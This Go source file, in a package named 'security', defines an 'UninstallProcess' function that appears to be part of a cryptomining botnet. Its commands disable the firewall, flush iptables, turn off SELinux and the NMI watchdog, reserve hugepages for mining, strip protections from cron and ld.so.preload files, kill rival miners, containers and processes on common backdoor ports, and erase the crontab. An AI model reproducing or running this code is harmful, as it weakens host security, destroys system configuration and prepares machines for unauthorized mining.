package security

func UninstallProcess() {
	ExecuteGroup([]string{
		"chattr -i /etc/ld.so.preload",
		"ufw disable",
		"iptables -F",
		"service iptables",
		"stop sysctl",
		"kernel.nmi_watchdog=0",
		"echo 0 >/proc/sys/kernel/nmi_watchdog",
		"echo 'kernel.nmi_watchdog=0' >>/etc/sysctl.conf",
		"setenforce 0",
		"echo SELINUX=disabled > /etc/selinux/config",
		"sysctl -w vm.nr_hugepages=$(nproc --all)",
		"chattr -R -ia /var/spool/cron",
		"chattr -ia /etc/crontab",
		"chattr -R -ia /var/spool/cron/crontabs",
		"chattr -R -ia /etc/cron.d",
		"chattr -iua /tmp/",
		"chattr -iua /var/tmp/",
		"killall log_rot",
		`ps aux | grep -v grep | egrep '2t3ik|qW3xT.2|ddg|./oka|postgres: .. . . /etc/ld.so.preload /etc/rc.d/init.d/kthrotlds /tmp/kthrotlds /usr/sbin/watchdogs /dev/shm/z3.sh /dev/shm/z2.sh /dev/shm/.scr /dev/shm/.kerberods /usr/bin/config.json /usr/bin/exin /usr/local/lib/libioset.so /etc/cron.d/tomcat /etc/rc.d/init.d/watchdogs docker ps | egrep 'pocosow|gakeaws|azulu|auto|xmr|mine|monero|slowhttp|bash.shell|entrypoint.sh|/var/sbin/bash' | awk '{print $1}' | xargs -I % docker kill % docker images -a | grep 'pocosow|gakeaws|buster-slim|hello-|azulu|registry|xmr|auto|mine|monero|slowhttp' | awk '{print $3}' | xargs -I % docker rmi -f % netstat -anp | egrep ':143|:2222|:3333|:3389|:4444|:5555|:6666|:6665|:6667|:7777|:8444|:3347|:14433' | awk '{print $7}' | awk -F'[/]' '{print $1}' | grep -v '-' | xargs -I % kill -9 % crontab -r`,
	})
}